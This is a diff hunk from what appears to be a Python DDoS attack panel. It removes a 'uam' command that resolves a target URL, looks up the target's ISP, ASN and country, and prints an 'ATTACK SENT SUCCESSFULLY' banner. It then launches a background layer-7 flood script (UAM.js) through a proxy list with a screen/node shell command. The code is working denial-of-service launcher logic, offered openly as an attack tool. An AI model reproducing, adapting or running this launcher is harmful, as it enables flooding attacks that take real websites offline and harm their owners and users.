@@ -902,54 +902,6 @@ def main():
             except IndexError:
                 main()
 
-        elif sinput == "uam" or sinput == "UAM":
-            try:
-                url = sin.split()[1]
-                port = sin.split()[2]
-                duration = int(sin.split()[3])
-
-                # Mendapatkan IP dari URL
-                ip = get_ip_from_url(url)
-
-                if ip:
-                    # Mendapatkan ISP, ASN, Org, dan Country untuk IP target
-                    asn, isp, org, country = get_ip_info(ip)
-                    
-                    # Menambahkan serangan ke dalam ongoing_attacks list
-                    ongoing_attacks.append({
-                        'host': ip,
-                        'start_time': t.time(),  # Menyimpan waktu mulai serangan
-                        'duration': duration,  # Durasi serangan dalam detik
-                        'method': 'uam',
-                        'status': 'Ongoing'
-                    })
-                    os.system('clear')
-                    print(f"""⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[38;2;255;0;0m⣤⢤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀ 
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[38;2;255;0;0m⡸⠁⠘⢉⣷⠀⠀⠀⠀⠀⠀⠀⠀ 
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[38;2;255;0;0m⣰⠁⠀⠀\033[37m⢀⡇⣇⡰⠲⣆⠀⠀⠀⠀ \033[1;34mＰＯＷＥＲＥＤ ＢＹ ： [ • ＣｏｄｅＳｙｎｔａｘ • ]\033[0m
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[38;2;255;0;0m⡴⠁⠀⠀\033[37m⢰⣾⡦⣾⠁⠀⢸⡆⠀⠀⠀ \033[37m\x1b[38;2;255;0;0m\x1b[48;2;255;255;255mATTACK - DETAILS\033[0m
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[38;2;255;0;0m⣀⣤⢴⠞⠁⠀⠀⠀\033[37m⠘⡆⣀⣿⠀⠀⡼⠀⠀⠀⠀    \033[37m\033[1;37mSTATUS:      \x1b[38;2;255;0;0m[\033[1;34m ATTACK SENT SUCCESSFULLY\x1b[38;2;255;0;0m ]
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠞⡱⣶⡾⠀⠀⠀⠀⠀⠀\033[37m⣿⠋⠀⠀⢰⠃⠀⠀⠀⠀    \033[37m\033[1;37mHOST:        \x1b[38;2;255;0;0m[\033[1;34m {url}\x1b[38;2;255;0;0m ]
-⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⢸⡧⠏⠀⠀⠀⠀⠀⠀⠀\033[37m⠁⠀⣀⡴⣿⠀⠀⠀⠀⠀    \033[37m\033[1;37mPORT:        \x1b[38;2;255;0;0m[\033[1;34m {port}\x1b[38;2;255;0;0m ]
-⠀⠀⠀⠀⠀⠀⠀⣴⠃⠀⢸⣿⣾⠀⠀⠀⠀⠀⠀\033[37m⣜⣀⣾⠿⣷⣿⠀⠀⠀⠀⠀    \033[37m\033[1;37mTIME:        \x1b[38;2;255;0;0m[\033[1;34m {duration}\x1b[38;2;255;0;0m ]
-⠀⠀⠀⠀⠀⠀⣸⡿⠀⢠⣄⠸⢹⣷⠀⠀⢆⠀⠀\033[37m⣏⡿⠉⠀⠈⢹⡀⠀⠀⠀⠀    \033[37m\033[1;37mMETHOD:      \x1b[38;2;255;0;0m[\033[1;34m {sinput}\x1b[38;2;255;0;0m ]
-⠀⠀⠀⠀⠀⣠⠟⠀⣤⠀⣿⠃⠞⢹⣶⣰⣼⠀⠀⠉⠀⠀⠀⠀⠈⢧⠀⠀⠀⠀    \033[37m\033[1;37mSTART ATTACK:\x1b[38;2;255;0;0m[\033[1;34m {waktu()} \x1b[38;2;255;0;0m]
-⠀⠀⠀⣀⡾⠧⢴⣾⣿⢠⠏⠀⠀⠘⢹⡿⠏⠀⠀⠀⠀⠀⠀⠀⠀\033[37m⠘⣆⠀⠀⠀ \033[37m\x1b[38;2;255;0;0m\x1b[48;2;255;255;255mTARGET - DETAILS\033[0m
-\x1b[38;2;255;0;0m⠐⠺⢿⣿⣧⣠⣴⣿⣥⣿⡄⠀⠀⠀⠀⠳⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀\033[37m⠘⡆⠀⠀    \033[37m\033[1;37mASN:        \x1b[38;2;255;0;0m [\033[1;34m {asn}\x1b[38;2;255;0;0m ]
-⠀⠀⠀⠀⣽⣿⡍⠙⠛⢻⣀⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⢳⡀⠀⠀\033[37m⣀⢰⣿⡀⠀    \033[37m\033[1;37mISP:        \x1b[38;2;255;0;0m [\033[1;34m {isp}\x1b[38;2;255;0;0m ]
-⠀⠀⠀\x1b[38;2;255;0;0m⣸⠟⣿⣰⠃⠀⠈⣿⢷⠀⣀⠀⠀⠀⠀\033[37m⠐⣦⡀⢸⣧⠀⢸⣿⣼⡟⡇⠀    \033[37m\033[1;37mORG:        \x1b[38;2;255;0;0m [\033[1;34m {org}\x1b[38;2;255;0;0m ]
-⠀⠀⠀\x1b[38;2;255;0;0m⠋⣼⣿⣿⢀⡄⠀⠈⠈⢧⣼⣦⡸⣄⠀⠀\033[37m⣼⢷⡞⠙⢷⣾⣿⠹⣿⡁⠀    \033[37m\033[1;37mCOUNTRY:    \x1b[38;2;255;0;0m [\033[1;34m {country}\x1b[38;2;255;0;0m ]
-⠀⠀⠀⢸⣿⣿⣿⡿⠀⠀⠀⠀⠀\x1b[38;2;255;0;0m⠛⠌⠳⣿⢷⣤⡇⠈⠀⠀⠀\033[37m⠙⢿⣆⠈⠻⡄ 
-⠀⠀⠀⠀\x1b[38;2;255;0;0m⢹⢁⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠙⢧⡀⠀⠀⠀⠀⠀\033[37m⢹⠙⣷⣧ \033[37mPlease After Attack Type \033[1;34m'CLS'\033[37m For Back To Home
-⠀⠀⠀⠀\x1b[38;2;255;0;0m⠘⠸⠿⠦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\033[37m⠈⢀⣿⠛ 
-\033[0m""")
-                    os.system(f'cd l7 && screen -dm node UAM.js {url} {duration} 32 4 proxy.txt')
-                    
-            except ValueError:
-                main()
-            except IndexError:
-                main()
-
         elif sinput == "h2-glo" or sinput == "H2-GLO":
             try:
                 url = sin.split()[1]
